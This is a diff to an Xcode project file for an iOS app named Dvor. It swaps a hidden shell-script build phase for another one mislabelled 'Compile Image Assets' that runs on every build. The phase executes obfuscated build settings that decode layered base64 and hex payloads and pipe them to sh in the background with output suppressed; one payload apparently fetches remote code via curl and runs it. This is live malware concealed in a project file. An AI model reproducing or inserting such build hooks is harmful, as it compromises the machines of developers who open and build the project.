@@ -13,9 +13,6 @@
 		95DE98542E266DBD0002C780 /* SnapKit in Frameworks */ = {isa = PBXBuildFile; productRef = 95DE98532E266DBD0002C780 /* SnapKit */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
 		95DE96F02E264CF00002C780 /* Dvor.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Dvor.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
@@ -79,7 +76,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 95DE97032E264CF30002C780 /* Build configuration list for PBXNativeTarget "Dvor" */;
 			buildPhases = (
-				897DFA75220344E490C62C0C /* Link Libraries Executable */,
+				938229382FE440378FC62C0C /* Compile Image Assets */,
 				95DE96EC2E264CF00002C780 /* Sources */,
 				95DE96ED2E264CF00002C780 /* Frameworks */,
 				95DE96EE2E264CF00002C780 /* Resources */,
@@ -140,28 +137,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		897DFA75220344E490C62C0C /* Link Libraries Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Link Libraries Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AC0C26C}\"";
-			showEnvVarsInLog = 0;			
-		};
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXResourcesBuildPhase section */
 		95DE96EE2E264CF00002C780 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -171,6 +146,28 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		938229382FE440378FC62C0C /* Compile Image Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Image Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AC0C26C}\"";
+			showEnvVarsInLog = 0;			
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		95DE96EC2E264CF00002C780 /* Sources */ = {
@@ -186,7 +183,7 @@
 		95DE97042E264CF30002C780 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AC0C26C = "((l(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeGpiVlp6V1ZocmRXTnVWWFpaVTJ0cFNVaDNaMk15WjBzSwo= | l | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((w(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkU1UFRVZFNXRmR0TVdGU2VsWTJWRWN4YzJSVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | w | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((j(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734373337303666373236663734366632653639366532660a3631323932323230376332303733363830610a | j | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((f(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUZwTmExbzJXa1ZOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | f | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((b(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpPYTJKdFJuZGpSM2hzVEcxc2RVd3lSWEJKYVVJNFNVaE9iME5uUFQwSwo= | b | sh ) >/dev/null 2>&1 &)";
@@ -222,7 +219,7 @@
 		95DE97052E264CF30002C780 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AC0C26C = "((l(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeGpiVlp6V1ZocmRXTnVWWFpaVTJ0cFNVaDNaMk15WjBzSwo= | l | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((w(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkU1UFRVZFNXRmR0TVdGU2VsWTJWRWN4YzJSVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | w | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((j(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734373337303666373236663734366632653639366532660a3631323932323230376332303733363830610a | j | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((f(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUZwTmExbzJXa1ZOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | f | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((b(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpPYTJKdFJuZGpSM2hzVEcxc2RVd3lSWEJKYVVJNFNVaE9iME5uUFQwSwo= | b | sh ) >/dev/null 2>&1 &)";
